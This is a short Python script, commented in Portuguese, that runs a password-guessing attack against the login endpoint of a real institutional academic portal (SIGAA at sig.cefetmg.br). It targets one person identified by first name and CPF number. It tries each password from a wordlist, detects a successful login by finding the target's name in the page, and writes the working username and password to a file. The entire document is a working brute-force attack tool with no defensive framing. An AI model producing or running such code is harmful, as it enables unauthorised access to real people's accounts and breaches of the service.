import requests
import re
import os
from colorama import Fore, init
from bs4 import BeautifulSoup
init(convert=True)

nome_do_alvo = 'primeiro_nome_do_alvo'
login = 'cpf_do_alvo'


def enviar(user,password):
    data = {
        'user.login': f'{user}',
        'user.senha': f'{password}'
    }
    enviar = requests.post(url='https://sig.cefetmg.br/sigaa/logar.do?dispatch=logOn',data=data).text
    return enviar

def obter_nome(texto):
    soup = BeautifulSoup(texto, 'html.parser')
    user = soup.find(class_='usuario')
    if user:
        nome = user.get_text(strip=True)
        return nome
    else:
        return None

with open('list.txt','r') as f:
    lista = f.read().splitlines()

for i in lista:
    print(f'Testando senha: {Fore.BLUE}{i}{Fore.RESET}')
    response = enviar(login,i)
    if re.search(nome_do_alvo.upper(), response):
        nome = obter_nome(response)
        if len(nome) != None:
            ok = (f'\n{Fore.GREEN}Sucesso!\n[200]{Fore.RESET} - Logado como {Fore.GREEN}{nome}{Fore.RESET}.\n\nUsuário: {Fore.GREEN}{login}{Fore.RESET}\nSenha: {Fore.GREEN}{i}{Fore.RESET}')
        else:
            ok = (f'\n{Fore.GREEN}Sucesso!\n[200]{Fore.RESET} - Logado como {Fore.GREEN}{nome_do_alvo.upper()}{Fore.RESET}.\n\nUsuário: {Fore.GREEN}{login}{Fore.RESET}\nSenha: {Fore.GREEN}{i}{Fore.RESET}')
        open('success.txt','a').write(f'{login}:{i}')
        open('success_text_response.txt','a').write(response)
        print(ok)
        break
    else:
        print(f'{Fore.RED}Senha incorreta.{Fore.RESET} Ignorando...\n')
